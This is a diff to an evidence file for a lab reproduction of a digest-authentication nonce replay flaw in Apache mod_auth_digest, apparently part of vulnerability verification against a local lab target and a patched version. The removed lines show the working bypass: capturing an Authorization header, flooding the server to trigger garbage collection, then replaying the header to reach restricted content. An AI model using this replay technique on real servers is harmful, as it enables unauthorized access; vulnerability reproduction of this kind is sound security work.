@@ -1,38 +1,25 @@
-# Scenario 1 — CVE-2026-73636 · mod_auth_digest one-time-nonce replay
-# target: http://127.0.0.1:8080/digest/   (2026-10-26 16:07 UTC)
+CVE-2026-73636 Digest Replay Evidence
+=====================================
+(Note: Runbook labels this Scenario 1; Scaffold labels it Scenario 2. Both refer to this CVE. We follow the Runbook's Scenario 1 designation.)
 
-## 3.2 Precondition: AuthDigestNonceLifetime 0 + Digest challenge
-$ docker exec acw3-target grep -n 'AuthDigestNonceLifetime' /usr/local/apache2/conf/lab-vuln.conf
-92:# AuthDigestNonceLifetime 0 is the vulnerable setting: it is meant to make each
-106:    AuthDigestNonceLifetime 0
-$ curl -sSI http://127.0.0.1:8080/digest/ | tr -d '\r' | grep -i '^WWW-Authenticate:'
-WWW-Authenticate: Digest realm="ACW3 Restricted", nonce="CQAAAAAAAAA=73912836028a10cbb2c9af01641de2f4507b0ea8", algorithm=MD5, opaque="7", qop="auth"
+--- Vulnerable Target (Apache 2.4.68) ---
+1. Captured Request & Response: digest-vulnerable-capture.txt
+2. Immediate Control Headers (401): digest-vulnerable-control-headers.txt
+3. Immediate Control Body: digest-vulnerable-control-body.txt
+4. Full Server Logs (includes GC): digest-vulnerable-full-target.log
+5. Isolated GC Logs: digest-vulnerable-gc.log
+6. Replay Headers (200 OK): digest-vulnerable-replay-headers.txt
+7. Replay Body (Restricted Content): digest-vulnerable-replay-body.txt
+8. Active Config During Test: digest-vulnerable-active-config.txt
 
-## 3.3 Capture a valid Digest Authorization header
-Captured Authorization header (truncated):
-  Authorization: Digest username="digestuser", realm="ACW3 Restricted", nonce="CgAAAAAAAAA=57a64bfede2ac452e90bc2d575541...
-Original authenticated request status + sent auth line:
-  < HTTP/1.1 401 Unauthorized
-  > Authorization: Digest username="digestuser", realm="ACW3 Restricted", nonce="CgAAAAAAAAA=57a64bfede2ac452e90bc2d57554166944bb3495", uri="/digest/", cnonce="f7MW1ADbxXsglEBF", nc=00000001, qop=auth, response="cb4b34bb5f701ccd9653854ccc135c58", opaque="8", algorithm=MD5
-  < HTTP/1.1 200 OK
-
-## 3.4 Negative control — replay BEFORE any GC (runbook expects 401)
-Immediate replay HTTP status: 401
-
-## 3.5 Trigger client-entry garbage collection (96 unauth requests)
-Sent 96 unauthenticated requests to fill the client shared-memory table.
-GC-related log lines captured: 17  (looking for "gc'd ... client entries")
-  acw3-target  | [Mon Oct 26 16:07:53.446585 2026] [auth_digest:info] [pid 19:tid 79] AH01766: gc'd 6 client entries. Total new clients: 6; Total removed clients: 6; Total renewed clients: 0
-  acw3-target  | [Mon Oct 26 16:07:53.497763 2026] [auth_digest:info] [pid 19:tid 95] AH01766: gc'd 6 client entries. Total new clients: 12; Total removed clients: 12; Total renewed clients: 0
-  acw3-target  | [Mon Oct 26 16:07:53.526760 2026] [auth_digest:info] [pid 19:tid 59] AH01766: gc'd 6 client entries. Total new clients: 18; Total removed clients: 18; Total renewed clients: 0
-  acw3-target  | [Mon Oct 26 16:07:53.553311 2026] [auth_digest:info] [pid 16:tid 20] AH01766: gc'd 6 client entries. Total new clients: 24; Total removed clients: 24; Total renewed clients: 0
-
-## 3.6 Replay the identical captured header AFTER GC
-Post-GC replay HTTP status: 200
-  -> replay body CONTAINS the restricted page ('ACW3 restricted area')
-
-## Verdict (from observed codes)
-  immediate-replay (pre-GC) control : 401   (runbook success criterion: 401)
-  GC observed                        : yes
-  post-GC replay                     : 200    (runbook success criterion: 200)
-  => BYPASS REPRODUCED (control 401, post-GC replay 200).
+--- Patched Target (Apache 2.4.69) ---
+1. Patched Version Proof: digest-patched-version.txt
+2. Captured Request & Response: digest-patched-capture.txt
+3. Immediate Control Headers (401): digest-patched-control-headers.txt
+4. Immediate Control Body: digest-patched-control-body.txt
+5. Full Server Logs (includes GC): digest-patched-full-target.log
+6. Isolated GC Logs: digest-patched-gc.log
+7. Replay Headers (401 Unauthorized): digest-patched-replay-headers.txt
+8. Replay Body (Denied): digest-patched-replay-body.txt
+9. Active Config During Test (lifetime 0): digest-patched-active-config.txt
+10. Cleanup Proof (restored to 300): digest-patched-cleanup-config.txt
